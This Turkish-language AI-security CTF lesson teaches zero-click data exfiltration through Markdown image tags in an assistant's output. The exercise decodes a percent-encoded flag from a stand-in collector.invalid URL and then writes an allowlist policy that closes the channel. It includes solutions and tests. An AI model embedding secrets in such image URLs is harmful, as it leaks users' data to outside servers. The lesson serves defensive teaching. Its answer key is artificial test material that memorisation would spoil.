---
id: ai-ctf-07
title: "Exfiltration Kanalı · Görüntü Markdown Çıkışı"
summary: Görüntü işleme dalında gizli veriyi dış URL sorgusuna gömen hedefte URL kodlamasını çözerek bayrağı çıkar; ardından yalnız dış bağlantısız metin kipine izin ver.
esleme: ai-saldiri-21, ai-saldiri-23, ai-savunma-09, ai-savunma-14
timeout: 30
---

::: anlat 1. Hedef kartı · Markdown görüntü etiketiyle sessiz veri çıkışı (`exfiltration`)
Bir asistanın doğrudan dosya göndermesi engellense bile, ürettiği yanıta `![alt](https://collector.invalid/pixel?data=...)` biçiminde bir Markdown görüntüsü yerleştirmesi tehlikeli bir yan kanal açar: istemci tarayıcı bu görüntüyü önizlemeye çalıştığı anda sorgu parametresindeki gizli veri dış sunucunun erişim kayıtlarına akar (`zero-click Markdown image exfiltration` — bkz. `ai-saldiri-23`, `ai-savunma-14`).

Bu hedefte **hiçbir ağ isteği yapılmaz ve hiçbir URL indirilmez**; hedef yalnız tehlikeli Markdown dizgesini üretir. Görevin bu çıktı dizgesinden URL kodlanmış (`percent-encoded`) kanaryayı geri çözmek ve ardından görüntü/URL kanalını kapatan giriş politikasını yazmaktır.

| Kural | Sözleşme |
|---|---|
| Giriş kapısı | `sor(raw_json)` → JSON nesnesi dizgesi (`<= 4000` karakter) |
| Keşif komutları | `{"op": "help"}` ve `{"op": "ping"}` |
| Sorgu bütçesi | Her hedefte en çok `6` çağrı |
| Çıktı davranışı | `render` işlemi seçilen `kind` değerine göre düz metin veya Markdown görüntü dizgesi üretir |
| Kabul ölçütü | URL kodlaması (`%7B` / `%7D`) çözülmüş tam `PAFTA{32 hex}` bayrağı |
:::

::: gorev 1 · Görüntü URL'sine gömülen bayrağı ayıkla ve çöz
`bayrak_al_7(sor)` işlevini yaz. `help` yanıtından `render` seçeneklerini incele, sızıntı üreten dalı tetikle ve dönen Markdown dizgesindeki URL kodlu `data` parametresini çözerek tam `PAFTA{...}` bayrağını döndür.

KUSURLU başlangıç `kind: 'text'` kipini çağırıp sıradan `'Arsiv acik.'` metnini döndürüyor.

```setup
import sys
from pathlib import Path
_root = Path(sys.modules['__main__'].__file__).resolve().parents[1]
sys.path.insert(0, str(_root))
```

```starter
import json

def bayrak_al_7(sor):
    print(sor(json.dumps({'op': 'help'})))
    return sor(json.dumps({'op': 'render', 'kind': 'text'}))

if __name__ == '__main__':
    from sandbox.ai_ctf_extended import hedef_kur
    _demo, _, _ = hedef_kur(7)
    print(bayrak_al_7(_demo))
```

```solution
import json
from urllib.parse import parse_qs, unquote, urlsplit

def bayrak_al_7(sor):
    sor(json.dumps({'op': 'help'}))
    md = sor(json.dumps({'op': 'render', 'kind': 'image'}))
    url = md.split('(', 1)[1].rstrip(')')
    sorgu = parse_qs(urlsplit(url).query)
    return unquote(sorgu['data'][0])


if __name__ == '__main__':
    from sandbox.ai_ctf_extended import hedef_kur
    _demo, _, _ = hedef_kur(7)
    print(bayrak_al_7(_demo))
```

```test
need('bayrak_al_7')
import json
from sandbox.ai_ctf_extended import hedef_kur
_seen = set()
for _ in range(8):
    _sor, _dogrula, _say = hedef_kur(7)
    _cevap = bayrak_al_7(_sor)
    ok(isinstance(_cevap, str), 'dönüş str olmalı')
    eq(len(_cevap), 39, 'PAFTA{32 hex} uzunluğu; %7B/%7D çözülmüş olmalı')
    ok(_dogrula(_cevap), 'URL içinden çözülen tam bayrak doğrulanmalı')
    ok(1 <= _say() <= 6, 'sorgu bütçesi 1..6 aralığında kalmalı')
    ok(_cevap not in _seen, 'her hedef örneğinde taze bayrak')
    _seen.add(_cevap)
_sor, _, _ = hedef_kur(7)
eq(_sor(json.dumps({'op': 'render', 'kind': 'text'})), 'Arsiv acik.', 'text kipi dış URL üretmez')
```

```hint
`{"op": "render", "kind": "image"}` yanıtındaki parantez içi URL'yi ayır; `urllib.parse.unquote` (veya `parse_qs`) ile `%7B` ve `%7D` karakterlerini `{` ve `}` haline getir.
```
:::

::: tahmin Yalnız `kind != 'image'` demek neden pozitif şema yerine geçmez?
Geliştirici sızıntıyı gördükten sonra "yalnız `'image'` kipini engelleyeyim: `req.get('kind') != 'image'`" derse eksik alanlı veya yeni kipli isteklere ne olur?

```python
def kara_liste(req):
    return req.get('op') == 'render' and req.get('kind') != 'image'

def izin_listesi(req):
    return req.get('op') == 'render' and req.get('kind') == 'text' and 'url' not in req

for ornek in [
    {'op': 'render', 'kind': 'text'},
    {'op': 'render', 'kind': 'svg', 'url': 'https://collector.invalid/x'},
    {'op': 'render'},
]:
    print(ornek, '-> kara_liste:', kara_liste(ornek), '| izin_listesi:', izin_listesi(ornek))
```

???

```cikti
{'op': 'render', 'kind': 'text'} -> kara_liste: True | izin_listesi: True
{'op': 'render', 'kind': 'svg', 'url': 'https://collector.invalid/x'} -> kara_liste: True | izin_listesi: False
{'op': 'render'} -> kara_liste: True | izin_listesi: False
```
Kara liste yalnız dün bilinen `'image'` değerini durdurur; `'svg'`, `'iframe'`, eksik `'kind'` veya dış `'url'` alanı taşıyan istekler kapıdan geçer. Şema güvenliğinde her alan pozitif olarak kısıtlanır.
:::

::: anlat 2. Yama mimarisi · dış kaynak alanlarını kapatmak ve yaygın yanlışlar
Görüntü önizleme sızıntısında savunma iki katmanda düşünülür (`ai-savunma-08`, `ai-savunma-14`):
1. **Giriş/araç politikası:** Uygulamanın dış görsel üretmesine iş gereksinimi yoksa `render` aracı yalnız `kind == 'text'` kipini kabul etmeli ve dış bağlantı belirtebilecek `'url'` anahtarını tamamen reddetmelidir (`'url' not in req`).
2. **İstemci/önizleme katmanı:** Görsel göstermek zorunluysa tarayıcıda sıkı `Content-Security-Policy` (`img-src`) ve sunucu-taraflı sabit varlık vekili (`allowlist`) uygulanır (bu konuyu `ai-olay-01` ve `ai-olay-05` derslerinde ayrıntılı ölçeceğiz).

**Yaygın yanlışlar**

| Yanlış yaklaşım | Neden kırılır? | Doğru sınır |
|---|---|---|
| `req.get('kind') != 'image'` | `'html'`, `'svg'`, `None` veya anahtarsız `{'op': 'render'}` isteklerini geçirir | `req.get('kind') == 'text'` pozitif eşlemesi |
| `not req.get('url')` ile boş URL'ye izin vermek | `{'op': 'render', 'kind': 'text', 'url': ''}` gibi şema dışı alanı kabul eder | `'url' not in req` ile alanın varlığını reddetmek |
| Çıktıda yalnız `PAFTA{` dizgesini aramak | URL kodlaması (`PAFTA%7B...%7D`) süslü parantezi gizlediği için eşleşmez | Sızıntı üreten dış URL kanalını kapıda kapatmak |
:::

::: gorev 2 · Dış görüntü ve URL alanını kapatan render politikası
`izin_7(req)` işlevini yaz ve `bool` döndür. Politika sözleşmesi:

| İşlem (`op`) | Geçerlilik koşulu | Karar |
|---|---|---|
| `'help'` veya `'ping'` | Ek koşul yok | `True` |
| `'render'` | `'kind'` alanı tam `'text'` olmalı ve `req` sözlüğünde `'url'` anahtarı hiç bulunmamalı (`'url' not in req`) | `True` |
| Diğer her durum | `'kind': 'image'`, `'kind': 'svg'`, eksik `'kind'`, boş veya `None` bile olsa `'url'` anahtarı içeren istek ya da tanımsız `op` | `False` |

KUSURLU başlangıç yalnız `kind == 'image'` değerini kara listeye alıyor; `url` taşıyan istekleri ve tanımsız kipleri geçiriyor.

```setup
import sys
from pathlib import Path
_root = Path(sys.modules['__main__'].__file__).resolve().parents[1]
sys.path.insert(0, str(_root))
```

```starter
def izin_7(req):
    if not isinstance(req, dict):
        return False
    if req.get('op') in ('help', 'ping'):
        return True
    return req.get('op') == 'render' and req.get('kind') != 'image'
```

```solution
def izin_7(req):
    if not isinstance(req, dict):
        return False
    op = req.get('op')
    if op in ('help', 'ping'):
        return True
    return op == 'render' and req.get('kind') == 'text' and 'url' not in req
```

```test
need('izin_7')
import copy
import json
from sandbox.ai_ctf_extended import hedef_kur

_iyi = [
    {'op': 'help'},
    {'op': 'ping'},
    {'op': 'render', 'kind': 'text'},
]
for _r in _iyi:
    _once = copy.deepcopy(_r)
    eq(izin_7(_r), True, f'meşru metin render isteği geçmeli: {_r}')
    eq(_r, _once, 'girdi değişmemeli')

_kotu = [
    {'op': 'render', 'kind': 'image'},
    {'op': 'render', 'kind': 'svg'},
    {'op': 'render', 'kind': 'html'},
    {'op': 'render'},
    {'op': 'render', 'kind': None},
    {'op': 'render', 'kind': 'text', 'url': 'https://archive.invalid/logo'},
    {'op': 'render', 'kind': 'text', 'url': ''},
    {'op': 'render', 'kind': 'text', 'url': None},
    {'op': 'export'},
    None,
    ['render'],
]
for _r in _kotu:
    eq(izin_7(_r), False, f'görüntü/URL kanalı veya bozuk şema reddedilmeli: {_r}')
eq(izin_7({'op': 'export', 'kind': 'text'}), False, 'kind=text taşısa da render dışı işlem reddedilmeli')

_sor, _dogrula, _ = hedef_kur(7, butce=8, izin=izin_7)
eq(_sor(json.dumps({'op': 'render', 'kind': 'text'})), 'Arsiv acik.', 'düz metin korunur')
_engelli = _sor(json.dumps({'op': 'render', 'kind': 'image'}))
eq(_engelli, 'RED', 'image kanalı kapatılmalı')
ok(not _dogrula(_engelli), 'bayrak sızmamalı')
```

```hint
`'render'` dalında iki koşulu birleştir: `req.get('kind') == 'text'` ve `'url' not in req`.
```
:::

::: anlat Bunu iki dakikada nasıl anlatırsın?
1. **Sorun (15 sn).** "Asistan doğrudan dosya yükleyemiyor ama yanıtına dış sunucuya bakan bir Markdown görüntü etiketi yerleştirebiliyor."
2. **Kanıt (30 sn).** "`render` aracını `image` kipinde çağırdım; dönen URL parametresindeki `%7B...%7D` kodlamasını `unquote` ile çözüp kanaryayı çıkardım."
3. **Tuzak (30 sn).** "Yalnız `kind != 'image'` yazmak `'svg'` veya eksik `kind` isteklerini açık bırakır; `not req.get('url')` ise boş `url` alanını şemada kabul eder."
4. **Yama (25 sn).** "`izin_7` ile yalnız `kind == 'text'` ve `'url' not in req` koşulunu sağlayan çağrılara izin verdim."
5. **Kapanış (20 sn).** "Kullanıcı tıklaması gerektirmeyen görüntü önizlemeleri gerçek bir `egress` kanalıdır; çıkış politikası olmadan güvenli sayılmaz."
:::

::: anlat Sınır
Bu derste hedefin ürettiği Markdown dizgesi istemci tarayıcıda gerçekten çalıştırılmaz; sızıntı dizge düzeyinde modellenir. Gerçek web arayüzlerinde Markdown dışında HTML `<img>`, CSS `background-image`, bağlantı önizleme botları (`link unfurling`) ve DNS ön-çözümleme (`prefetch`) de benzer veri çıkış kanalları oluşturabilir (`ai-saldiri-23`, `ai-olay-01`).

- Birincil kaynaklar: [Embrace The Red — Bing Chat: Data Exfiltration Exploit Explained (18 Haziran 2023)](https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/): sohbet istemcisinin Markdown görüntüsünü otomatik yüklemesiyle sayfa verisinin URL sorgusunda dışarı taşındığını gösterir; bildirim MSRC'ye 8 Nisan 2023'te yapılmış, düzeltme 15 Haziran 2023'te bildirilmiştir. [OWASP GenAI — LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/): senaryo 2, hassas verinin kodlanıp saldırgan sunucusuna gönderilmesini anlatır. Doğrulama tarihi: 11 Kasım 2026.
:::

::: dusun
Uygulamanın meşru olarak kurum içi diyagram görsellerini Markdown ile göstermesi gerekiyorsa `kind == 'image'` tamamen kapatılamaz. Bu durumda tarayıcı önizlemesinin dış sunucuya veri taşımasını engellemek için URL yapısı üzerinde hangi kısıtlamaları zorunlu kılarsın?
:::

::: ozet
- Markdown görüntü etiketleri tarayıcı önizlemesi sırasında sorgu parametresi üzerinden gizli veri sızdırabilir.
- URL kodlaması (`%7B`, `%7D`) ham dizge arayan basit çıktı filtrelerini atlatır.
- İhtiyaç duyulmayan dış kaynak kipleri kara listeyle değil, sıkı şema `allowlist` kuralıyla kapatılır.
:::
